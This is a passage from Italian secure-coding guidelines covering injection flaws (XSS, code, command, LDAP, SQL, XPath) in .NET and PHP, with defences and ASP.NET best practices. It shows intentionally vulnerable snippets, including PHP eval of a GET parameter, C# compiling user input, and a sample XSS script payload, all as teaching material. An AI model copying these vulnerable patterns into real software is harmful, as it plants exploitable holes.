Linee guida per lo sviluppo sicuro Pag. 116  a 156  
 
Il Cross Site Scripting può essere reflected o stor ed. Nel primo caso, uno script inoculato è valido s olo 
all’interno della sessione corrente, ma i suoi effe tti possono essere molto dannosi per il sito vittim a 
dell’attacco. 
Ancora più grave è il Cross Site Scripting di tipo stored. In questo caso lo script inoculato viene me morizzato 
come parte intregrante della pagina all’interno di un database e rispristinato ogni qual volta la pagi na in 
questione viene caricata. Quest’attacco è stato sfr uttato ampiamente nel recente passato, soprattutto 
laddove veniva consentito agli utenti di inserire r ecensioni, commenti e altri contributi. 
 
Volendo schematizzare, possiamo categorizzare gli a ttacchi XSS nelle seguenti tipologie: 
• Reflected XSS, in cui la stringa dannosa proviene d alla richiesta dell’utente. 
• Stored XSS, in cui la stringa dannosa proviene dal database del sito Web. 
 
Esiste anche un Cross Site Scripting dovuto a una l acuna nella codifica UTF-7, che permettere di masch erare 
i caratteri “<” e “>”, facendoli sfuggire al contro llo. Questa minaccia non è più possibile nei modern i 
browser, ad eccezione di Microsoft Internet Explore r 11.  
 
Come difendersi 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano). Occo rre controllare il tipo del dato, la sua dimensione , 
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Codificare completamente tutti i dati dinamici prim a di incorporarli (encoding). La codifica 
dovrebbe essere sensibile al contesto, in base al t ipo di dato che si vuole neutralizzare: se ci si 
aspetta che possa esserci codice HTML abusivo, occo rre codificare gli eventuali tag HTML, se ci si 
potrebbe trovare di fronte a uno script, allora bis ogna codificare gli elementi sintattici di Javascri pt, 
ecc. 
• Si consiglia di utilizzare la libreria di codifica ESAPI. 
• Nell'intestazione di risposta Content-Type HTTP, è necessario definire esplicitamente la codifica dei 
caratteri (charset) per l'intera pagina. 
• Impostare l’attributo HTTPOnly per proteggere il co okie della sessione da indebite letture da parte 
di script malevoli. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html, 
CWE-79: Improper Neutralization of Input During Web  Page Generation ('Cross-site Scripting'). 
 
Esempio: 
Nel seguente codice, un dato in input (parametro pe r la ricerca viene stampato a video, senza averlo p rima 
sottoposto ad alcun controllo): 
Sub cmdSearch _Click(Source As Object, _ e As Event Args)  
  
// Do Search….. 
 
lblResult.Text="You Searched for: " & txtInput.Text   
 
// [loop per mostrare I risultati della query] 
 
End Sub  
7.8.2  Code Injection 
Come riconoscerla 
 
 
Linee guida per lo sviluppo sicuro Pag. 117  a 156  
 
L'applicazione esegue del codice ricevuto attravers o l’input che non è stato sufficientemente verifica to. Un 
utente in grado di inserire codice arbitrario può p rendere il controllo dell’applicazione e del server , se non 
sono state adottate tecniche di difesa in profondit à. 
Esempio: 
Il codice seguente mostra come del codice .NET può essere passibile di code injection: 
String codiceUtente = request.Form["Codice"]; 
  
CSharpCodeProvider compiler = new CSharpCodeProvide r(); 
CompilerParameters parametri = new CompilerParamete rs();  
parametri.GenerateInMemory = true; 
parametri.GenerateExecutable = true; 
 
try  
{ 
 CompilerResults risultati  = compiler.CompileAssemblyFromSource(parametri, 
codiceUtente); 
   
 Assembly compilato = risultati .CompiledAssembly;  
 exitCode = (int)compilato.EntryPoint.Invoke(null, new object[0]); 
 
Come difendersi. 
• È vietata qualsiasi esecuzione dinamica di codice r icevuto da canali non attendibili. Se è prorpio 
necessario compilare ed eseguire dinamicamente del codice dinamico, occorre allore predisporre 
una sandbox isolata, ad esempio AppDomain di .NET o  un thread isolato.  
• Devono essere effettuati tutti i controlli possibil i per validare il codice in ingresso. 
• Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di 
privilegi non necessari. 
• Se è possibile optare per isolare tutta l'esecuzion e dinamica utilizzando un account utente separato 
e dedicato che abbia privilegi solo per le operazio ni e i file specifici utilizzati dal codice da eseg uire, 
in base al principio denominato "Principle of Least  Privilege". Il principio stabilisce che agli utent i 
venga attribuito il più basso livello di “diritti” che possano, detenere rimanendo comunque in grado 
di compiere il proprio lavoro. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/94.html, 
Improper Control of Generation of Code ('Code Injec tion') CWE-94. 
7.8.3  Command Injection 
Come riconscerla 
Sfruttando questa vulnerabilità un aggressore potre bbe eseguire comandi di sistema arbitrari 
sull’application server. Il danno che potrebbe esse re arrecato comprende: 
• la possibilità di modificare i permessi all’interno  di file o directory nel file system (read / create  / 
modify / delete); 
• la possibilità di instaurare connessioni di rete no n autorizzate verso il server;  
• la possibilità di gestire i servizi di sistema, avv iandoli, fermandoli o rimuovendoli; 
• la completa acquisizione del controllo del server d a parte dell'attaccante. 
In pratica, l'applicazione manda in esecuzione sul server comandi di sistema operativo inseriti 
dell’attaccante. L'operazione spesso viene effettua ta utilizzando stringhe di input controllate dall'u tente, 
sulle quali non viene effettuata alcuna verifica. 
Potrebbero così essere eseguiti direttamente sul se rver comandi anche molto pericolosi per il sistema o per 
la sicurezza dei dati. 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 118  a 156  
 
Come difendersi 
• Rimodulare il codice per evitare una qualsiasi esec uzione diretta di script di comandi. Per effettuare  
operazioni di sistema, utilizzare eventualmente API  fornite dalla piattaforma. 
• Se non è possibile fare a meno di lanciare shell de i comandi, assicurarsi tuttavia di eseguire solo 
stringhe statiche, che non includano l'input dell'u tente. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La convalida dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, e scartati i dati che non rientrano in  questa categoria. I parametri devono essere limita ti 
a un set di caratteri consentito e i caratteri rico nosciuti come estranei devono essere filtrati e 
neutralizzati (escaping). Oltre ai caratteri, occor re controllare il tipo del dato, la sua dimensione,  
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di 
privilegi non necessari. 
• L’esecuzione del codice dovrebbe utilizzare un acco unt utente separato e dedicato, fornito dei soli 
privilegi strettamente necessari, in base al princi pio denominato "Principle of Least Privilege". Il 
principio stabilisce che agli utenti venga attribui to il più basso livello di “diritti” che possano 
detenere rimanendo comunque in grado di compiere il  proprio lavoro. 
 
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/77.html,  
CWE-77: Improper Neutralization of Special Elements  used in a Command ('Command Injection'). 
 
7.8.4  Connection String Injection 
Come riconoscerla 
Questo tipo di attacchi è possibile nel momento in cui l’applicazione affida all’input utente la compo siszione 
dinamica della stringa di connessione al database o ppure al server. 
Un utente malintenzionato potrebbe manipolare la st ringa di connessione dell'applicazione al database 
oppure al server. Utilizzando strumenti e modifiche  di testo semplici, l'aggressore potrebbe essere in  grado 
di eseguire una delle seguenti operazioni: 
• Danneggiare le performance delle applicazioni (ad e sempio incrementando il valore relativo al MIN 
POOL SIZE); 
• Manomettere la gestione delle connessioni di rete ( ad esempio, tramite TRUSTED CONNECTION); 
• Dirigere l'applicazione sul database fraudolento an ziché a quello genuino; 
• Scoprire la password dell'account di sistema nel da tabase (tramite un brute-force attack). 
 
Per comunicare con il proprio database o con un alt ro server (ad esempio Active Directory), l'applicaz ione 
costruisce dinamicamente una sua stringa di conness ione. Questa stringa di connessione viene costruita  
dinamicamente con l’input inserito dall’utente. Se i valori immessi sono stati verificati in misura 
insufficiente o non sono stati affatto verificati, la stringa di connessione potrebbe essere manipolat a ad arte 
a vantaggio dell’attaccante. 
Come difendersi 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano). In g enerale, è necessario controllare il tipo del dato,  la 
sua dimensione, l'intervallo di validità (range), i l formato ed eventuali valori attesi (white list). 
• Evitare di costruire dinamicamente stringhe di conn essione. Se è necessario creare dinamicamente 
una stringa di connessione evitare di includere l'i nput dell'utente. In ogni caso, utilizzare utilità 
basate sulla piattaforma, come SqlConnectionStringB uilder di .NET, o almeno codificare l'input 
validato come il piu' idoneo per la piattaforma uti lizzata.  
 
 
Linee guida per lo sviluppo sicuro Pag. 119  a 156  
 
• Nelle prime versioni di ASP.NET le stringhe di conn essione erano memorizzate nel file web.config. 
Adesso, le più recenti applicazioni ASP.NET Core po ssono leggere le configurazioni da varie fonti 
come appsettings.json, da variabili di ambiente, da  argomenti della riga di comando, ecc. È 
possibile, in pratica, archiviare la stringa di con nessione ovunque si voglia. In ogni caso, è sempre 
meglio che comporla a runtime con l’input dell’uten te. Si separa così l’applicazione dai metadati. Il 
file in questione deve essere messo in sicurezza at tivando la modalità “protected configuration”, 
che permette di memorizzare le stringhe di connessi one in forma crittografata (encrypted). 
 
Esempio.  
Nel seguente codice la stringa di connessione viene  letta dal file appsettings.json e la sua composizi one non 
è vulnerabile ad alcuna injection: 
var builder = new ConfigurationBuilder(); 
builder.AddJsonFile("appsettings.json", optional: f alse); 
var configuration = builder.Build(); 
connectionString = configuration.GetConnectionStrin g("SQLConnection");   
 
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/99.html,  
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
7.8.5  LDAP Injection 
Come riconoscerla 
La LDAP Injection è un tipo di attacco cui sono vul nerabili le applicazioni e che utilizzano l’input, senza 
verificarlo adeguatamente, per costruire query LDAP  (Lightweight Directory Access Protocol). 
Se coronato da successo, l’LDAP injection potrebbe consentire un furto di informazioni, un’elevazione dei 
privilegi e l’autenticazione con un’identità altrui  (spoofing). 
Per comunicare con la directory delle utenze (ad es empio Active Directory), l'applicazione costruisce 
dinamicamente delle query. Se utilizza l’input uten te senza verificarlo, un malintenzionato può inseri re 
comandi modificati ad arte per carpire informazioni  non dovute. 
Come difendersi 
Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia l ’approccio 
white list (sono accettati solo i dati che adottano  una struttura specificata nella white list, scarta ndo quelli 
che non la rispettano). Occorre controllare il tipo  del dato, la sua dimensione, l'intervallo di valid ità (range), 
il formato ed eventuali valori attesi (white list).  
A partire dalla versione 3.5 del Framework .NET, so no state introdotte nella libreria AntiXSS della ve rsione 4 
due nuove funzioni che permettono l’encoding delle stringhe da utilizzare per le query LDAP: 
• Encoder.LdapFilterEncode. Codifica l'input converte ndo i valori non sicuri in \n, dove n rappresenta 
il carattere non sicuro. 
• Encoder.LdapDistinguishedNameEncode. Codifica l'inp ut convertendo i valori non sicuri in #n, dove 
n rappresenta il carattere non sicuro, mentre i seg ni “,”, “+”, “/”, “<” e “>” vengono codificati con la 
barra (“\”). 
 
Esempio: 
Formato non corretto: 
ds.Filter = "(&(name=" + input + ")(isPublic=true)) "  
 
Formato corretto: 
ds.Filter = "(&(name=" + Encoder.LdapFilterEncode(i nput) + ")(isPublic=true))"  
 
Per ulteriori informazioni: http://cwe.mitre.org/data/definitions/90.html,  
CWE-90: Improper Neutralization of Special Elements  used in an LDAP Query ('LDAP Injection'). 
 
 
Linee guida per lo sviluppo sicuro Pag. 120  a 156  
 
7.8.6  Resource Injection 
Come riconoscerla  
Quando un'applicazione definisce un tipo di risorsa  o posizione in base all'input dell'utente, come un  nome 
file o un numero di porta, questi dati possono esse re manipolati per eseguire o accedere a risorse div erse. 
L’attacco di “path traversal” è un caso particolare  della resource injection. In tal caso a essere ini ettato è un 
path manipolativo che punta a risorse diverse nel f ile system. 
Se si utilizza l’input dell’utente per definire la porta sulla quale aprire un socket, si da all’utent e la possibilità 
di introdurre una backdoor attraverso la quale potr ebbe prendere il controllo del sistema. 
Come difendersi 
• In molti casi non è necessario aprire un socket man ualmente; meglio affidarsi a librerie e protocolli 
esistenti. 
• Tutti i dati inviati devono essere crittografati, s e sono sensibili. Nel dubbio se i dati siano sensib ili o 
possano diventarlo, meglio comunque crittografarli.  
• Qualsiasi input letto dal socket deve essere valida to. 
• Le applicazioni non dovrebbero utilizzare l’input d ell’utente per accedere a risorse del sistema. Nel 
caso si scelga di farlo, è obbligatorio validare l’ input, per esempio attraverso una white list. Se si  
consente la creazione di socket, controllare scrupo losamente questo tipo di attività. 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/99.html,  
CWE-99: Improper Control of Resource Identifiers (' Resource Injection'). 
 
7.8.7  SQL Injection  
Come riconoscerla  
I dati forniti dall'utente, in un modulo (form) o a ttraverso i parametri dell’URL, devono essere sempr e 
considerati non attendibili e potenzialmente corrot ti. La composizione dinamica di query SQL, a partir e da 
dati non verificati, consente agli aggressori di in serire valori appositamente predisposti per modific arne il 
contenuto e il significato. Gli attacchi di SQL inj ection possono leggere, modificare o eliminare info rmazioni 
riservate dal database e talvolta persino metterlo fuori uso o eseguire comandi arbitrari di sistema 
operativo. 
Come difendersi 
• In genere, la soluzione consiste nel fare affidamen to su query parametriche, piuttosto che sulla 
concatenazione di stringhe. Questa tecnica fornisce  un valido escaping dei caratteri pericolosi. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list: dovrebbero essere accetta ti solo i dati che adattano a una struttura 
specificata, scartando quelli che non rispettano la  white list. Occorre controllare il tipo del dato, la 
sua dimensione, l'intervallo di validità (range), i l formato ed eventuali valori attesi (white list). 
• Limitare l'accesso agli oggetti e alle funzionalità  di database, in base al "Principle of Least Privil ege" 
(non fornire agli utenti permessi più elevati di qu elli strettamente necessari per svolgere il loro 
lavoro). 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/89.html,  
CWE-89: Improper Neutralization of Special Elements  used in an SQL Command ('SQL Injection'). 
7.8.8  XPath Injection 
Come riconoscerla  
 
 
Linee guida per lo sviluppo sicuro Pag. 121  a 156  
 
Gli attacchi XPath Injection sono possibili quando un sito Web utilizza le informazioni fornite dall'u tente per 
costruire una query XPath per i dati XML. Inviando informazioni intenzionalmente malformate nel sito W eb, 
un utente malintenzionato può scoprire come sono st rutturati i dati XML o accedere a dati a cui 
normalmente non avrebbe accesso. Potrebbe persino e ssere in grado di elevare i suoi privilegi sul sito  Web 
se i dati XML vengono utilizzati per l'autenticazio ne (come un file utente basato su XML).  
Come difendersi 
• Evitare che la costruzione della query XPath dipend a dalle informazioni inserite dall'utente. 
Possibilmente mapparla con i parametri utente mante nendo la separazione tra dati e codice. Nel 
caso fosse necessario includere l'input dell’utente  nella query, questo dovrà essere 
precedentemente validato. 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. La validazione dovrebbe essere 
basata su una white list (si dovrebbero accettare s olo i dati che adattano a una struttura 
specificata, scartando quelli che non la rispettano ). Occorre controllare il tipo del dato, la sua 
dimensione, l'intervallo di validità (range), il fo rmato ed eventuali valori attesi (white list). 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/643.html,  
CWE-643: Improper Neutralization of Data within XPa th Expressions ('XPath Injection'). 
 
7.8.9  Ulteriori indicazioni per lo sviluppo sicuro 
7.8.9.1  ASP.NET Web Form 
Web form è una tecnologia basata su ASP.NET di Micr osoft, in cui il codice eseguito sul server genera 
dinamicamente l'output di pagina Web al browser o a l dispositivo client. È uno dei quattro modelli (as sieme 
a ASP.NET MVC, ASP.NET Web Pages, ASP.NET Single Pa ge Applications) di programmazione che possono 
essere utilizzati per la creazione di applicazioni web ASP.NET. 
È compatibile con qualsiasi browser, dispositivo mo bile o linguaggio supportato da .NET ed è flessibil e in 
quanto offre la possibilità di aggiungere controlli  creati dall'utente e terze parti. 
 
Segue un elenco di best practices per lo sviluppo s icuro. 
• Concatenazione di stringhe : Utilizzare StringBuilder. Nella concatenazione de lle stringhe, l’uso di 
StringBuilder è preferibile rispetto a String.Conca t o all'utilizzo dell'operatore '+'. Più nel dettag lio, 
StringBuilder è più performante nella concatenazion e di un numero elevato di stringhe (>=3), 
mentre ha prestazioni equiparate a String.Concat pe r un minor numero (<3) di stringhe. 
• Ajax UpdatePanel : Evitare chiamate superflue al server. Controllare  Page.IsPostBack al 
caricamento della pagina per assicurarsi che la log ica di inizializzazione della pagina venga eseguita  
quando una pagina viene caricata la prima volta e n on in risposta ai postback dei client. Per le 
convalide, devono essere utilizzati script lato cli ent. 
• ViewState e HiddenFields : Mantenere i dati minimi in ViewState. ViewState è  valido solo per il 
postback delle stesse pagine: i dati vengono trasme ssi al client e restituiti in un campo nascosto. 
Disattiva ViewState a PageLevel utilizzando EnableV iewState. 
• Sessione : Variabili di sessione 
o Non dovrebbero esistere più di 20 variabili di sess ione nel contesto applicativo. 
o Tenere TimeOut di sessione. 
o Disattivare lo stato della sessione, se non si util izza in una particolare pagina / applicazione. 
• Reindirizzare : Server.Trasfer vs Response.Redirect. Utilizza Ser ver.Transfer per reindirizzare alle 
pagine della stessa applicazione e Response.Redirec t per reindirizzare verso una pagina esterna o 
quando è necessario avviare un nuovo contesto. 
• DataReader : Utilizzare DataReader per il binding dei dati. Se  l'applicazione non richiede la 
memorizzazione nella cache, è possibile utilizzare DataReader.  
 
 
Linee guida per lo sviluppo sicuro Pag. 122  a 156  
 
o Utilizzare DataReader per recuperare i dati e caric arli in un DataSet. Non passare questo 
DataSet tra i diversi livelli. Passare entità perso nalizzate tra i diversi livelli. 
• Resource : Chiusura delle risorse. Una delle problematiche p iù comuni ai programmatori è la 
sistematica chiusura delle risorse e/o connessioni aperte. Capita spesso, infatti, che per errori e/o 
eccezioni impreviste non gestite al meglio, alcune risorse rimangano in attesa di una chiusura che 
non arriverà mai. Per cui, chiudere le connessioni quando non in uso, migliora la sicurezza e le 
prestazioni. Prevedere meccanismi di chiusura autom atica delle risorse (attraverso un gestore che 
viene eseguito ad ogni uscito dal blocco). 
• Inizialiazzazione  delle  variabili . Inizializzare la variabile @ start e usarla in un a fase successiva 
provoca molte operazioni PUSH / POP. Quindi, inizia lizzare le variabili al momento/posto giusto. Le 
variabili intere non devono essere inizializzate a zero perché vengono inizializzate 
automaticamente. Le variabili stringhe invece, devo no essere inizializzate esplicitamente. 
• Richiesta http : Utilizzare Fiddler. Utilizza Fiddler per intercet tare le richieste HTTP e per sapere 
quale richiesta richiede più tempo. Individua anche  le eccezioni causate durante ogni richiesta 
HTTP. 
• URL : Rewriting URL. Per gli URL che dispongono di info rmazioni riservate, è consigliabile 
implementare URL Rewriters. Gli URL devono essere c oerenti. 
• Settings : Application settings.  
o Fissare un valore per la Content-Length. Questo imp one la connessione aperta per un 
tempo limitato (prestabilito) e la chiusura automat ica della stessa quando viene superato il 
limite temporale dichiarato. 
o Crittografare le stringhe di connessione sul server . 
o Assicurarsi che tutte le DLL di riferimento siano p resenti nel GAC. 
o Disattivare il tracciamento e il debug. Set <retail  = "true" /> nel file machine.config - obbliga 
il debug a essere falso, disattiva la traccia di ou tput e reindirizza alla pagina di errore 
personalizzata piuttosto che alla pagina di errore effettiva. 
• Web  services : Impedire il sovraccarico dei servizi web 
o Impedire il sovraccarico dei servizi web tramite at tacchi DoS (Denial of Service): 
o Controllare se si tratta di una prima visita o la v isita ripetuta per la stessa funzione dal 
medesimo IP. 
o Utilizzare connessioni SQL attendibili nei servizi Web. 
o Assicurarsi che ci siano chiamate asincrone ai serv izi web. 
• Eccezioni : Gestire le eccezioni 
o Registrare le eccezioni e visualizzare il messaggio  appropriato all'utente. Definire una classe 
base MyException. La classe deve definire: 
o Informazioni utili per l’utente: Cosa è successo; C osa è stato colpito; Quali sono le azioni da 
intraprendere; Altre iInformazioni di supporto. 
o Informazioni utili per la registrazione dell’eccezi one: Nome del server, Istanza id, ID utente, 
Stack di chiamata, Nome Assembly & Versione, Fonte,  tipo e messaggio di eccezione, 
Redirect secondo il livello di errore, Livello di a pplicazione (Cattura errori in global.asax 
nella funzione Application_Error), Livello di pagin a (Utilizza la funzione Page_Error per 
registrare gli errori). 
 
7.8.9.2  ASP.NET MVC 
ASP.NET MVC è una parte del framework  .NET che per mette di creare siti scalabili suddividendo la logi ca di 
programmazione in base al metodo Model-View-Control ler. Segue un elenco di best practices per lo 
sviluppo sicuro: 
• Isolate Controllers. Isolare i controllers dalle di pendenze, da HttpContext, dalle classi di accesso a i 
dati, dalla configurazione, dalla registrazione, ec c. L'isolamento può essere ottenuto creando classi 
di wrapper e utilizzando un contenitore IoC (Invers ion of Control). 
 
 
Linee guida per lo sviluppo sicuro Pag. 123  a 156  
 
• Utilizzare gli IoC Container per gestire tutte le d ipendenze esterne. Di seguito sono riportati alcuni  
dei contenitori / framework: Ninject, autofac, stru ctureMap, Unity block, Castle Windsor. 
• Creare ViewModel per ogni View. Creare un ViewModel  specifico per ogni visualizzazione. Il ruolo 
del ViewModel dovrebbe interessare solo il binding di dati e non dovrebbe contenere alcuna logica. 
• Utilizzare HtmlHelper. Per generare view html utili zzare HtmlHelper. Se l'attuale HtmlHelper non è 
sufficiente estenderlo utilizzando i metodi di este nsione. Questo manterrà la progettazione 
controllata. 
• Decorare action methods con verbi appropriati come Get o Post, se applicabile. 
• Utilizzare l’attributo OutputCache.  
• Decorare gli action methods più utilizzati con Outp utCache attribute. 
• Controller e Domain logic. Cercare di separare il c ontroller dal dominio logico. Il controller deve 
essere responsabile solo delle seguenti funzioni:  
o convalidare l'input; 
o ottenere i dati relativi alla view dal modello; 
o ritornare la view appropriata o reindirizzare ad un  altro metodo di azione appropriato. 
• Utilizzare il modello Post-Redirect-Get. Il modello  PRG viene utilizzato per evitare l'avvio del 
browser classico quando si aggiorna una pagina dopo  il POST. Ogni volta che fai una richiesta POST, 
una volta completata la richiesta, effettua un rein dirizzamento. In questo modo, quando l'utente 
aggiorna la pagina, verrà eseguita l'ultima richies ta GET piuttosto che il POST. Questo consente di 
evitare problemi di usabilità non necessari e imped isce che la richiesta iniziale venga eseguita due 
volte evitando così possibili problemi di duplicazi one. 
• View e presentation logic: la View non deve contene re presentation logic. Non ci dovrebbe essere 
alcuna logica di dominio nelle viste. Le viste devo no essere solamente responsabili della 
visualizzazione dei dati. Per esempio se un pulsant e "Elimina" deve essere visualizzato solo 
dall’utente con ruolo "Amministratore", ciò dovrebb e essere estratto in un helper HTML.  
 
7.9  PHP 
PHP è un linguaggio di scripting lato server, proge ttato per lo sviluppo web ma anche usato come 
linguaggio di programmazione generico. Originariame nte creato da Rasmus Lerdorf nel 1994, PHP è ora 
distribuito da The PHP Group. PHP originariamente s ignificava “home page personale”, ma ora è l'acroni mo 
ricorsivo PHP: Hypertext Preprocessor. 
Il codice PHP può essere incorporato nel codice HTM L oppure può essere utilizzato in combinazione con 
vari sistemi di modelli Web, sistemi di gestione de i contenuti Web e framework web. Il codice PHP vien e 
solitamente elaborato da un interprete PHP implemen tato come modulo nel web server. Il codice PHP può 
essere ancora incorporato nel codice HTML, ma più f requentemente può essere utilizzato in combinazione  
con vari sistemi di modelli Web, sistemi di gestion e dei contenuti Web e framework. Il codice PHP vien e 
solitamente elaborato da un interprete PHP implemen tato come modulo nel web server. 
 
Segue un elenco delle principali vulnerabilità e co ntromisure da adottare. 
7.9.1  Cross-site scripting (XSS)  
Come riconoscerla 
Il Cross Site Scripting consiste nella possibilità che un attaccante possa inserire nella pagina 
dell’applicazione, quindi nel codice HTML, script c he, una volta eseguiti, possano trarre in inganno i  legittimi 
utenti, trafugare informazioni e predisporre nuovi attacchi.  
Questa minaccia, enormemente diffusa, è dovuta allo  scarso controllo dell’input da parte delle web 
application.  
 
 
 
Linee guida per lo sviluppo sicuro Pag. 124  a 156  
 
Il Cross Site Scripting può essere reflected o stor ed. Nel primo caso, uno script inoculato è valido s olo 
all’interno della sessione corrente, ma i suoi effe tti possono essere molto dannosi per il sito vittim a 
dell’attacco. 
Ancora più grave è il Cross Site Scripting di tipo stored. In questo caso lo script inoculato viene me morizzato 
come parte integrante della pagina all’interno di u n database e rispristinato ogni qual volta la pagin a in 
questione viene caricata. Quest’attacco è stato sfr uttato ampiamente nel recente passato, soprattutto 
laddove veniva consentito agli utenti di inserire r ecensioni, commenti e altri contributi. 
Volendo schematizzare, possiamo categorizzare gli a ttacchi XSS nelle seguenti tipologie: 
• Reflected XSS, in cui la stringa dannosa proviene d alla richiesta dell’utente. 
• Stored XSS, in cui la stringa dannosa proviene dal database del sito Web. 
 
Esiste anche un Cross Site Scripting dovuto a una l acuna nella codifica UTF-7, che permettere di masch erare 
i caratteri “<” e “>”, facendoli sfuggire al contro llo. Questa minaccia non è più possibile nei modern i 
browser, ad eccezione di Microsoft Internet Explore r 11.  
Come difendersi 
• Validare tutti gli input, indipendentemente dalla l oro provenienza. Per la validazione, si consiglia 
l’approccio white list (sono accettati solo i dati che adottano una struttura specificata nella white 
list, scartando quelli che non la rispettano). Occo rre controllare il tipo del dato, la sua dimensione , 
l'intervallo di validità (range), il formato ed eve ntuali valori attesi (white list). 
• Codificare completamente tutti i dati dinamici prim a di incorporarli (encoding). La codifica 
dovrebbe essere sensibile al contesto, in base al t ipo di dato che si vuole neutralizzare: se ci si 
aspetta che possa esserci codice HTML abusivo, occo rre codificare gli eventuali tag HTML, se ci si 
potrebbe trovare di fronte a uno script, allora bis ogna codificare gli elementi sintattici di Javascri pt, 
ecc. 
• Si consiglia di utilizzare la libreria di codifica messa a disposizione da PHP. Fra le varie funzioni sono 
da ricordare: htmlspecialchars(), htmlentities(), s trip_tags() e add_slashes(). Le prime sono 
utilizzate per l’escaping di codice HTML, l’ultima per bonificare codice Javascript. 
• Nell'intestazione di risposta Content-Type HTTP, è necessario definire esplicitamente la codifica dei 
caratteri (charset) per l'intera pagina. 
• Impostare l’attributo HTTPOnly per proteggere il co okie della sessione da indebite letture da parte 
di script malevoli. 
 
Esempio: 
Il dcodice che segue prende in input una variabile utente e la stampa a video: 
 
 echo $_POST["name"]; 
 
Se l’utente, invece di inserire il proprio nome, in serisce del codice attivo, per esempio 
“<script>alert(‘Attacco XSS!’)</script>”, crea un c aso di attacco XSS. 
Per bonificare il codice, la stringa accettata deve  essere controllata e depurata dei caratteri dannos i: 
 
 echo htmlentities($_POST["name"]); 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/79.html,  
CWE-79: Improper Neutralization of Input During Web  Page Generation ('Cross-site Scripting'). 
7.9.2  Code Injection 
Come riconoscerla 
 
 
Linee guida per lo sviluppo sicuro Pag. 125  a 156  
 
Un utente malintenzionato potrebbe eseguire codice arbitrario nell'host del server di applicazioni. A 
seconda delle autorizzazioni dell'applicazione che potrebbero essere carpite, si potrebbero avere le 
seguenti problematiche: 
• Possibilità di modificare i permessi all’interno di  file o directory nel file system(read / create / 
modify / delete); 
• Modifiche della struttura del sito web; 
• Permettere delle connessioni di rete non autorizzat e verso il server da parte dell'attaccante, 
• Permettere ad utenti malintenzionati la gestione de i servizi con possibili Start and stop dei servizi di 
sistema, 
• Acquisizione completa del server da parte dell'atta ccante. 
Come difendersi 
Se possibile, preferite sempre delle white list con  valori prefissati. Evitare qualsiasi compilazione dinamica, 
esecuzione o valutazione del codice. Se è necessari o eseguire tutto il codice dinamico in una sandbox 
isolata, ad esempio AppDomain di .NET o bloccare un  thread isolato. 
L'applicazione non deve compilare, eseguire o valut are i dati non attendibili, in particolare eventual e input 
dell'utente. Validare tutti gli input, indipendente mente dalla loro provenienza. La convalida dovrebbe  
essere basata su una white list: dovrebbero essere accettati solo i dati che adattano a una struttura 
specificata, e scartati i dati che non rientrano in  questa categoria. I parametri devono essere limita ti a un 
set di caratteri consentito e i caratteri riconosci uti come estranei devono essere filtrati e neutrali zzati 
(escaping). Oltre ai caratteri, occorre controllare  il tipo del dato, la sua dimensione, l'intervallo di validità 
(range), il formato ed eventuali valori attesi (whi te list). 
Nel caso fosse assolutamente necessario includere i  dati di input in un’esecuzione dinamica, applicare  una 
validazione dell'input molto rigida. Ad esempio, ac cettare solo interi tra determinati valori. 
Configurare l'applicazione da eseguire utilizzando un account utente limitato che non disponga di priv ilegi 
non necessari. 
L’esecuzione del codice dovrebbe utilizzare un acco unt utente separato e dedicato, fornito dei soli pr ivilegi 
strettamente necessari, in base al principio denomi nato "Principle of Least Privilege". Il principio s tabilisce 
che agli utenti venga attribuito il più basso livel lo di “diritti” che possano detenere rimanendo comu nque in 
grado di compiere il proprio lavoro. 
 
Esempio: 
Codice vulnerabile. L’utente può iniettare qualsias i codice e farlo eseguire: 
if (isset($_GET['codè])) { 
 $code = $_GET['codè]; 
 eval($code); 
} 
Codice sicuro. La scelta è possibile all’interno di  una white list di funzioni statiche: 
$method = $_GET[method]; 
switch ($method) { 
 case "methodOne": 
  methodOne(); 
  break; 
 case "methodTwo":  
  methodTwo(); 
  break; 
 //... 
} 
 
Per ulteriori informazioni si veda: http://cwe.mitre.org/data/definitions/94.html,  
Improper Control of Generation of Code ('Code Injec tion') CWE-94. 
 
 
 
Linee guida per lo sviluppo sicuro Pag. 126  a 156  
 
7.9.3  Command Injection 
Come riconscerla 
Sfruttando questa vulnerabilità un aggressore potre bbe eseguire comandi di sistema arbitrari 
sull’application server. Il danno che potrebbe esse re arrecato comprende: 
• la possibilità di modificare i permessi all’interno  di file o directory nel file system (read / create  / 
modify / delete); 
• la possibilità di instaurare connessioni di rete no n autorizzate verso il server;  
• la possibilità di gestire i servizi di sistema, avv iandoli, fermandoli o rimuovendoli; 
• la completa acquisizione del controllo del server d a parte dell'attaccante. 
• Attraverso questa vulnerabilità l'applicazione vien e portata ad eseguire i comandi dell’attaccante. 
L'operazione spesso viene effettuata utilizzando st ringhe di input controllate dall'utente, sulle qual i 
non viene effettuata alcuna verifica. 
• Potrebbero così essere eseguiti direttamente sul se rver comandi anche molto pericolosi per il 
sistema o per la sicurezza dei dati. 
Come difendersi 
• Rimodulare il codice per evitare una qualsiasi esec uzione diretta di script di comandi. Per effettuare  
operazioni di sistema, utilizzare eventualmente API  fornite dalla piattaforma. 
